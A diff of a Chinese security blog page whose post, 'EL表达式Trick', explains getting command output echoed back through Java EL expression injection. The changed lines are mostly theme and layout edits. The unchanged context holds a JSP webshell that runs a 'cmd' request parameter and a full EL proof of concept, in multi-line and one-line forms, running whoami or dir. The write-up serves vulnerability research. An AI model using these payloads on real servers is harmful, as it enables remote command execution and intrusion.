@@ -3,14 +3,28 @@
 <head>
   <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="theme-color" content="#f7f7f4">
-<meta name="color-scheme" content="light">
+<meta name="color-scheme" content="light dark">
+<meta name="theme-color" content="#f7f7f4" data-theme-color-light="#f7f7f4" data-theme-color-dark="#161614">
 
 <title>EL表达式Trick — CurlySean&#39;s Blog</title>
 <meta name="description" content="这里是 CurlySean 的个人技术博客，记录漏洞研究、代码审计与攻防实践，整理可以复现、验证与继续推演的技术细节。">
-<link rel="canonical" href="http://curlysean.github.io/2025/12/18/EL%E8%A1%A8%E8%BE%BE%E5%BC%8FTrick/">
+<link rel="canonical" href="https://curlysean.github.io/2025/12/18/EL%E8%A1%A8%E8%BE%BE%E5%BC%8FTrick/">
+<link rel="preload" href="/fonts/instrument-sans-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/jetbrains-mono-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
 <link rel="stylesheet" href="/css/style.css">
-<script>document.documentElement.classList.add('js')</script>
+<script>
+  (function () {
+    try {
+      var key = 'sheepfold-theme';
+      var saved = localStorage.getItem(key);
+      var dark = saved === 'dark' || (saved !== 'light' && window.matchMedia('(prefers-color-scheme: dark)').matches);
+      document.documentElement.setAttribute('data-theme', dark ? 'dark' : 'light');
+      document.documentElement.classList.add('js');
+    } catch (error) {
+      document.documentElement.classList.add('js');
+    }
+  })();
+</script>
 
 <meta name="generator" content="Hexo 7.3.0"></head>
 <body class="page-type-post">
@@ -37,11 +51,18 @@
         <a class="desktop-nav__link" href="/about/">关于</a>
       
     </nav>
-    <a class="header-cta" href="/archives/">开始阅读 <span aria-hidden="true">↗</span></a>
-    <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
-      <span class="sr-only">打开导航</span>
-      <span></span><span></span>
-    </button>
+    <div class="site-header__actions">
+      <button class="theme-toggle" type="button" data-theme-toggle aria-label="切换颜色模式" title="切换颜色模式">
+        <span data-theme-toggle-label>暗色</span>
+      </button>
+      
+        <a class="header-cta header-cta--ghost" href="/archives/">全部文章 <span aria-hidden="true">↗</span></a>
+      
+      <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
+        <span class="sr-only">打开导航</span>
+        <span></span><span></span>
+      </button>
+    </div>
   </div>
   <nav class="mobile-nav" id="mobile-menu" aria-label="移动端主导航" data-mobile-menu>
     <div class="frame mobile-nav__inner">
@@ -90,12 +111,6 @@
         
       </div>
     </div>
-    <div class="frame post-meta-grid reveal">
-      <div><span>发布</span><time datetime="2025-12-18T13:27:56.000Z">2025.12.18</time></div>
-      <div><span>更新</span><time datetime="2025-12-18T13:27:56.000Z">2025.12.18</time></div>
-      <div><span>阅读</span><strong>12 MIN</strong></div>
-      <div><span>标签</span><strong>1</strong></div>
-    </div>
   </header>
 
   <div class="frame post-content-layout">
@@ -103,13 +118,19 @@
       <div class="post-rail__inner">
         <p class="eyebrow">ON THIS PAGE</p>
         
-          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#X4FJz"><span class="toc-text">EL表达式Trick</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#e4jBi"><span class="toc-text">EL表达式的回显问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pmbjN"><span class="toc-text">EL表达式Waf绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ThAUV"><span class="toc-text">参考文章</span></a></li></ol></li></ol></nav>
+          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#e4jBi"><span class="toc-text">EL表达式的回显问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pmbjN"><span class="toc-text">EL表达式Waf绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ThAUV"><span class="toc-text">参考文章</span></a></li></ol></nav>
         
       </div>
     </aside>
     <div class="article-column">
+      <div class="post-meta-grid reveal">
+        <div><span>发布</span><time datetime="2025-12-18T13:27:56.000Z">2025.12.18</time></div>
+        <div><span>更新</span><time datetime="2025-12-18T13:27:56.000Z">2025.12.18</time></div>
+        <div><span>阅读</span><strong>约 4 分钟</strong></div>
+        <div><span>标签</span><strong>1</strong></div>
+      </div>
       <div class="article-body">
-        <h1 id="X4FJz">EL表达式Trick</h1>
+        
 <h2 id="e4jBi">EL表达式的回显问题</h2>
 
 <p>在EL表达式中，想要进行命令执行，只需要一下一行表达式即可</p>
@@ -120,10 +141,10 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line"><span class="comment">//    System.out.println(process);</span></span><br><span class="line"><span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line"><span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream));</span><br><span class="line">String line;</span><br><span class="line"><span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">    response.getWriter().println(line);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
 
 <p>EL表达式的实现是由中间件Tomcat进行解析，然后进行反射调用，实际上的EL表达式只能写函数调用，并不能在EL表达式执行<code>new String()</code>、<code>int X</code>等定义与实例化操作</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1765974911923-d5fdb79c-ce60-4962-81cd-f842ea8b8e2f.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1765974911923-d5fdb79c-ce60-4962-81cd-f842ea8b8e2f.png" alt="EL表达式Trick" loading="lazy"></p>
 <p>在EL表达式中定义了11个隐式对象，使用这些隐式对象可以很方便地读取到Cookie、HTTP请求消息头字段、请求参数、Web应用程序中的初始化参数的信息</p>
 <p>例如我们可以通过<code>pageContext</code>来保存属性</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1765975035660-1432f51b-903a-469d-8126-e92013f05014.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1765975035660-1432f51b-903a-469d-8126-e92013f05014.png" alt="EL表达式Trick" loading="lazy"></p>
 <p>那么想要实现EL表达式的回显问题，可以通过以下步骤进行回显：</p>
 <ol>
 <li>使用<code>pageContext</code>保存<code>Runtime#exec</code>的<code>inputStream</code></li>
@@ -133,9 +154,9 @@
 </ol>
 <p>在平时使用中，我们知道可以通过<code>pageContext</code>对象保存属性</p>
 <p>那么我们也可以通过<code>pageContext</code>来保存<code>Runtime().exec()</code>的<code>inputStream</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1765975216762-c55ad8a3-ba86-4546-bde6-875c224daea2.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1765975256714-819c0867-d4f7-4775-8c63-ba9023b8ea6e.png"></p>
-<p>将<code>inputStream</code>保存到<code>pageContext</code>后，我们需要去寻找一个<code>byte[]</code>来接受<code>inputStream#read</code>返回的<code>byte[]</code><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1765978421798-b203bebf-0141-463b-aa61-eaf1ffdb1edc.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1765975216762-c55ad8a3-ba86-4546-bde6-875c224daea2.png" alt="EL表达式Trick" loading="lazy"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1765975256714-819c0867-d4f7-4775-8c63-ba9023b8ea6e.png" alt="EL表达式Trick" loading="lazy"></p>
+<p>将<code>inputStream</code>保存到<code>pageContext</code>后，我们需要去寻找一个<code>byte[]</code>来接受<code>inputStream#read</code>返回的<code>byte[]</code><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1765978421798-b203bebf-0141-463b-aa61-eaf1ffdb1edc.png" alt="EL表达式Trick" loading="lazy"></p>
 <p>在EL表达式中，类加载的范围只有在以下四个包下：</p>
 <p>因此我们在后续寻找利用类时，只能从这四个包下的类进行寻找</p>
 <ul>
@@ -152,7 +173,7 @@
 <p>最终Poc如下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageContext.setAttribute(<span class="string">&quot;inputStream&quot;</span>,Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>).getInputStream())&#125;</span><br><span class="line"></span><br><span class="line">$&#123;Thread.sleep(<span class="number">1000</span>)&#125;</span><br><span class="line"></span><br><span class="line">$&#123;pageContext.setAttribute(<span class="string">&quot;inputStreamAvailable&quot;</span>,inputStream.available())&#125;</span><br><span class="line"></span><br><span class="line">$&#123;pageContext.setAttribute(<span class="string">&quot;byteBufferClass&quot;</span>,Class.forName(<span class="string">&quot;java.nio.ByteBuffer&quot;</span>))&#125;</span><br><span class="line">$&#123;pageContext.setAttribute(<span class="string">&quot;allocateMethod&quot;</span>,byteBufferClass.getMethod(<span class="string">&quot;allocate&quot;</span>,Integer.TYPE))&#125;</span><br><span class="line">$&#123;pageContext.setAttribute(<span class="string">&quot;heapByteBuffer&quot;</span>,allocateMethod.invoke(<span class="literal">null</span>,inputStreamAvailable))&#125;</span><br><span class="line"></span><br><span class="line">$&#123;pageContext.getAttribute(<span class="string">&quot;inputStream&quot;</span>).read(heapByteBuffer.array(),<span class="number">0</span>,inputStreamAvailable)&#125;</span><br><span class="line"></span><br><span class="line">$&#123;pageContext.setAttribute(<span class="string">&quot;byteArrType&quot;</span>, heapByteBuffer.array().getClass())&#125;</span><br><span class="line"></span><br><span class="line">$&#123;pageContext.setAttribute(<span class="string">&quot;stringClass&quot;</span>,Class.forName(<span class="string">&quot;java.lang.String&quot;</span>))&#125;</span><br><span class="line">$&#123;pageContext.setAttribute(<span class="string">&quot;stringConstructor&quot;</span>,stringClass.getConstructor(byteArrType))&#125;</span><br><span class="line">$&#123;pageContext.setAttribute(<span class="string">&quot;stringRes&quot;</span>,stringConstructor.newInstance(heapByteBuffer.array()))&#125;</span><br><span class="line"></span><br><span class="line">$&#123;pageContext.getAttribute(<span class="string">&quot;stringRes&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1765980935970-c0a6579a-0e40-47e0-bec4-46bb54302546.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1765980935970-c0a6579a-0e40-47e0-bec4-46bb54302546.png" alt="EL表达式Trick" loading="lazy"></p>
 <p>一句话版本如下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageContext.setAttribute(<span class="string">&quot;inputStream&quot;</span>, Runtime.getRuntime().exec(<span class="string">&quot;cmd /c dir&quot;</span>).getInputStream());Thread.sleep(<span class="number">1000</span>);pageContext.setAttribute(<span class="string">&quot;inputStreamAvailable&quot;</span>, pageContext.getAttribute(<span class="string">&quot;inputStream&quot;</span>).available());pageContext.setAttribute(<span class="string">&quot;byteBufferClass&quot;</span>, Class.forName(<span class="string">&quot;java.nio.ByteBuffer&quot;</span>));pageContext.setAttribute(<span class="string">&quot;allocateMethod&quot;</span>, pageContext.getAttribute(<span class="string">&quot;byteBufferClass&quot;</span>).getMethod(<span class="string">&quot;allocate&quot;</span>, Integer.TYPE));pageContext.setAttribute(<span class="string">&quot;heapByteBuffer&quot;</span>, pageContext.getAttribute(<span class="string">&quot;allocateMethod&quot;</span>).invoke(<span class="literal">null</span>, pageContext.getAttribute(<span class="string">&quot;inputStreamAvailable&quot;</span>)));pageContext.getAttribute(<span class="string">&quot;inputStream&quot;</span>).read(pageContext.getAttribute(<span class="string">&quot;heapByteBuffer&quot;</span>).array(), <span class="number">0</span>, pageContext.getAttribute(<span class="string">&quot;inputStreamAvailable&quot;</span>));pageContext.setAttribute(<span class="string">&quot;byteArrType&quot;</span>, pageContext.getAttribute(<span class="string">&quot;heapByteBuffer&quot;</span>).array().getClass());pageContext.setAttribute(<span class="string">&quot;stringClass&quot;</span>, Class.forName(<span class="string">&quot;java.lang.String&quot;</span>));pageContext.setAttribute(<span class="string">&quot;stringConstructor&quot;</span>, pageContext.getAttribute(<span class="string">&quot;stringClass&quot;</span>).getConstructor(pageContext.getAttribute(<span class="string">&quot;byteArrType&quot;</span>)));pageContext.setAttribute(<span class="string">&quot;stringRes&quot;</span>, pageContext.getAttribute(<span class="string">&quot;stringConstructor&quot;</span>).newInstance(pageContext.getAttribute(<span class="string">&quot;heapByteBuffer&quot;</span>).array()));pageContext.getAttribute(<span class="string">&quot;stringRes&quot;</span>)&#125;</span><br></pre></td></tr></table></figure>
 
@@ -194,13 +215,13 @@
   <nav class="frame post-navigation" aria-label="相邻文章">
     
       <a href="/2026/06/19/TongWeb%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
-        <span>← PREVIOUS</span>
+        <span>更新一篇</span>
         <strong>TongWeb反序列化</strong>
       </a>
     
     
-      <a href="/2025/12/12/Error%20Based%20XXE/">
-        <span>NEXT →</span>
+      <a class="post-navigation__older" href="/2025/12/12/Error%20Based%20XXE/">
+        <span>更早一篇</span>
         <strong>Error Based XXE</strong>
       </a>
     
@@ -214,9 +235,9 @@
       <a href="/">CURLYSEAN</a>
       <span>持续记录，保持验证。</span>
     </div>
-    <p class="site-footer__copyright">© 2026 CurlySean</p>
+    <p class="site-footer__copyright">© 2025–2026 CurlySean</p>
     <nav class="site-footer__links" aria-label="外部链接">
-      <a href="https://github.com/CurlySean" target="_blank" rel="noopener">GitHub ↗</a>
+      <a href="https://github.com/CurlySean" target="_blank" rel="noopener noreferrer">GitHub ↗</a>
       <a href="mailto:5345414e@gmail.com">Email ↗</a>
     </nav>
   </div>
